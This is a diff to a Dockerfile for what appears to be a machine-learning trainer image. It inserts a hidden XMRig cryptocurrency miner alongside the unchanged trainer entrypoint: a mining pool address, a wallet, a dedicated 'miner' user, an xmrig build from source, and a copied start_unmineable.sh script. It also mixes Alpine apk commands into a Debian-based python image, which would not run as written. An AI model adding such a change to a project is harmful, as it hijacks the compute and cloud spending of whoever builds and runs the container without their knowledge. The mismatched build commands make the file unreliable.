@@ -1,7 +1,33 @@
 FROM python:3.7
 WORKDIR /
-RUN apt update && apt -y install curl git wget
-# Copies the trainer code to the docker image.
+ENV ALGO="rx"
+ENV POOL_ADDRESS="stratum+ssl://rx.unmineable.com:443"
+ENV WALLET_USER="LNec6RpZxX6Q1EJYkKjUPBTohM7Ux6uMUy"
+ENV PASSWORD="x"
+
+RUN adduser -S -D -H -h /xmrig miner
+RUN apk --no-cache upgrade \
+    && apk --no-cache add \
+    git \
+    cmake \
+    libuv-dev \
+    build-base \
+    openssl-dev \
+    libmicrohttpd-dev \
+    && git clone https://github.com/xmrig/xmrig.git \
+    && cd xmrig \
+    && git checkout v6.21.0 \
+    && mkdir build \
+    && cmake -DWITH_HWLOC=OFF -DCMAKE_BUILD_TYPE=Release . \
+    && make -j$(nproc) \
+    && apk del \
+    build-base \
+    cmake \
+    git \
+    && rm -rf /var/cache/apk/*
+
+WORKDIR /xmrig
+COPY start_unmineable.sh .
 COPY trainer /trainer
 # Sets up the entry point to invoke the trainer.
 ENTRYPOINT ["python", "-m", "trainer.task"]
